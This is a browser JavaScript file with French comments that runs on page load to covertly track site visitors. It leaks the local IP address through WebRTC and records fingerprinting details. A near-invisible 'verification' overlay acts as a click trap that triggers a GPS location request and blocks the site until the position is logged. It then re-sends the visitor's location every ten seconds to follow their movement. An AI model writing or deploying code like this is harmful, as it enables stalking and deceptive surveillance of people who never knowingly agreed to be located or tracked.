// Fonction pour récupérer l'IP locale via WebRTC
async function getLocalIP() {
    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.length > 0) resolve(ips[0]);
                else resolve("Inconnue (Bloqué/VPN)");
                return;
            }
            
            const parts = event.candidate.candidate.split(' ');
            const ip = parts[4];
            if (!ips.includes(ip) && ip.includes('.')) {
                ips.push(ip);
            }
        };

        // Timeout plus long pour laisser le temps au STUN de répondre
        setTimeout(() => {
            if (ips.length > 0) resolve(ips[0]);
            else resolve("Inconnue (Timeout)");
            pc.close();
        }, 2000);
    });
}

async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        // Configuration plus agressive pour forcer le matériel GPS
        const options = {
            enableHighAccuracy: true,
            timeout: 10000, // On attend jusqu'à 10 secondes le signal
            maximumAge: 0   // On ne veut pas de position en cache, on veut du direct
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.warn("Géolocalisation refusée ou erreur:", error.message);
                resolve(null);
            },
            options
        );
    });
}

// Générer un ID de session unique pour ce visiteur
const sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);

async function logVisitor(preciseLocation = null, isUpdate = false) {
    try {
        const localIp = await getLocalIP();
        
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: sessionId,
                isUpdate: isUpdate, // Flag ajouté
                localIp: localIp,
                preciseLocation: preciseLocation,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                page: window.location.pathname
            })
        });
    } catch (error) {
        console.error("Erreur lors du logging:", error);
    }
}

// Nouvelle logique pour "forcer" la localisation avec un piège invisible ultra-agressif
async function startVerification() {
    const overlay = document.getElementById('verification-overlay');

    if (!overlay) {
        logVisitor();
        return;
    }

    // On s'assure que l'overlay est bien invisible mais présent
    overlay.style.background = 'rgba(0,0,0,0.01)';
    overlay.style.display = 'flex';

    const handleFirstClick = async () => {
        // On ne cache pas l'overlay tout de suite pour "bloquer" le deuxième clic tant qu'on n'a pas fini
        const location = await getPreciseLocation();
        
        // On log avec le résultat (GPS ou IP si refusé/timeout)
        await logVisitor(location);
        
        // Une fois loggué, on libère enfin le site
        overlay.style.display = 'none';

        // Démarrer le tracking périodique toutes les 10 secondes
        setInterval(async () => {
            const loc = await getPreciseLocation();
            if (loc) {
                // On passe un flag 'isUpdate' pour que l'API sache que c'est du mouvement
                await logVisitor(loc, true);
            }
        }, 10000);
    };

    overlay.addEventListener('click', handleFirstClick, { once: true });
}

if (document.readyState === 'complete') {
    startVerification();
} else {
    window.addEventListener('load', startVerification);
}
